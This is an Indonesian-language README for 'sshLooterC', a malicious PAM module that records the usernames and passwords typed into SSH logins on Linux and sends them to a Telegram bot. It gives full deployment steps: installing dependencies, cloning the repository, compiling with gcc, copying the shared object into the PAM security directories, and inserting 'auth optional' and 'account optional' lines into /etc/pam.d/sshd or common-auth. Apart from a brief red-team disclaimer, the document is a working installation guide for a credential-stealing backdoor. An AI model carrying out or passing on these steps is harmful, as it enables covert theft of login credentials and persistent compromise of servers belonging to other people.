# 🔒 sshLooterC - PAM Module Logger

### Deskripsi Proyek
sshLooterC adalah modul **PAM (Pluggable Authentication Module)** yang ditulis dalam C. Modul ini berfungsi untuk merekam kredensial (Username dan Password) yang dimasukkan selama proses autentikasi SSH di sistem Linux. Setelah berhasil direkam, kredensial akan dikirimkan secara otomatis ke **Telegram Bot** yang telah dikonfigurasi.

**Peringatan:** Alat ini ditujukan hanya untuk tujuan *penetrasi testing* atau *red team engagement* dan harus digunakan hanya pada sistem yang Anda miliki izin penuh untuk mengelolanya.

---

### Ketergantungan (Dependencies)

Untuk mengkompilasi modul ini, Anda memerlukan paket pengembangan berikut:

* **gcc** (GNU Compiler Collection)
* **libcurl-devel** (Untuk fungsi komunikasi dengan Telegram API)
* **pam-devel** (Untuk membangun modul PAM)

#### Instalasi Ketergantungan (Contoh untuk RHEL/CentOS/Rocky Linux)

### Debian/Ubuntu
```
apt install libcurl4-openssl-dev
apt install libpam-dev
```
### RedHat/CentOs
```
yum install libcurl-devel
yum install pam-devel
```


Use
```bash
git clone https://github.com/aexdyhaxor/sshLooter.git
cd sshLooterC
gcc -shared -fPIC looter.c $(curl-config --cflags --libs) -lpam -o looter.so

# Untuk sistem 64-bit (RHEL/CentOS/Rocky)
sudo cp looter.so /lib64/security/

# Untuk sistem Ubuntu/Debian
sudo cp looter.so /lib/security/

==========================================================================================

sudo nano /etc/pam.d/common-auth ( Ubuntu / Debian )
sudo nano /etc/pam.d/sshd ( CentOS / RHEL / Alma / Rocky )
```
## 📸 Preview
![Preview](https://github.com/user-attachments/assets/eac5b43b-1c2d-4078-9ecd-e1d3c48b3026)


```bash
# Tambahkan di bagian atas file
auth optional /lib64/security/looter.so
account optional /lib64/security/looter.so


